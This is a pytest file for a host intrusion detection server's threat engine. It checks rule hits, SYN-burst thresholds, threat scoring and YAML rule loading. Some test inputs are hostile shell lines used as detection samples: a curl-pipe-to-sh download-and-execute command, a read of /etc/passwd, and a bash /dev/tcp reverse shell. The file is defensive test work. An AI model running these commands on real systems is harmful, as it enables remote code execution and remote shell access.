"""威胁引擎行为对齐测试。"""

from pathlib import Path

from hids_server.threat import (
    Ruleset,
    SynBurstTracker,
    analyze_event,
    collect_builtin_hits,
    should_index_alert,
)

RULES_PATH = Path(__file__).resolve().parents[2] / "hids-server" / "rules" / "threat-rules.yaml"


def _tracker():
    return SynBurstTracker(window_sec=1, threshold=15)


def test_shell_suspicious_pattern():
    event = {"event_kind": 0, "line": "curl http://x.sh | sh", "ssh_client_ip": "1.1.1.1"}
    hits, ctx = collect_builtin_hits(event, _tracker())
    assert [h.id for h in hits] == ["shell_suspicious_pattern"]
    assert ctx.ssh_client_ip == "1.1.1.1"


def test_sensitive_port_touch():
    event = {"event_kind": 2, "flow_dst_port": 22}
    hits, _ = collect_builtin_hits(event, _tracker())
    assert [h.id for h in hits] == ["network_sensitive_port_touch"]


def test_syn_burst_fires_once_at_threshold():
    tracker = SynBurstTracker(window_sec=1, threshold=3)
    event = {
        "event_kind": 2,
        "flow_tcp_flags": 2,
        "flow_src_ip": "6.6.6.6",
        "flow_dst_port": 80,
        "host_id": "h",
        "ts_ms": 1000,
        "comm": "xdp",
    }
    fired = []
    for _ in range(5):
        hits, _ = collect_builtin_hits(event, tracker)
        fired.append(any(h.id == "network_syn_burst" for h in hits))
    # 第 3 次首达阈值触发一次，之后不再触发
    assert fired == [False, False, True, False, False]


def test_threat_merge_levels():
    tracker = _tracker()
    event = {"event_kind": 0, "line": "cat /etc/passwd && curl http://x | sh"}
    analyze_event(event, tracker, None)
    threat = event["threat"]
    assert threat["level"] == "medium"  # medium=22 → score 22
    assert threat["score"] == 22
    assert threat["model_version"] == "hids-threat-0.2.0"

    clean = {"event_kind": 0, "line": "ls"}
    analyze_event(clean, tracker, None)
    assert clean["threat"]["level"] == "none"
    assert clean["threat"]["score"] == 0


def test_info_hit_promoted_to_low():
    tracker = _tracker()
    event = {"event_kind": 7, "http_method": "POST", "http_url": "/api/login"}
    analyze_event(event, tracker, None)
    # info=4 → score 4 → level none，但有命中则强制 low
    assert event["threat"]["level"] == "low"
    assert event["threat"]["score"] == 4


def test_should_index_alert_thresholds():
    high = {"threat": {"level": "high"}}
    low = {"threat": {"level": "low"}}
    none = {"threat": {"level": "none"}}
    assert should_index_alert(high, "low")
    assert should_index_alert(low, "low")
    assert not should_index_alert(low, "medium")
    assert not should_index_alert(none, "low")
    assert not should_index_alert({}, "low")


def test_yaml_ruleset_loads_and_matches():
    ruleset = Ruleset.load(RULES_PATH)
    assert ruleset.rule_count >= 1
    assert ruleset.version

    tracker = _tracker()
    event = {"event_kind": 0, "line": "bash -i >& /dev/tcp/1.2.3.4/9999 0>&1"}
    hits, _ = ruleset.analyze(event, tracker)
    ids = {h.id for h in hits}
    # 内置 + YAML 同时命中
    assert "shell_suspicious_pattern" in ids
    assert any(h.evidence.get("source") == "yaml" for h in hits if isinstance(h.evidence, dict))
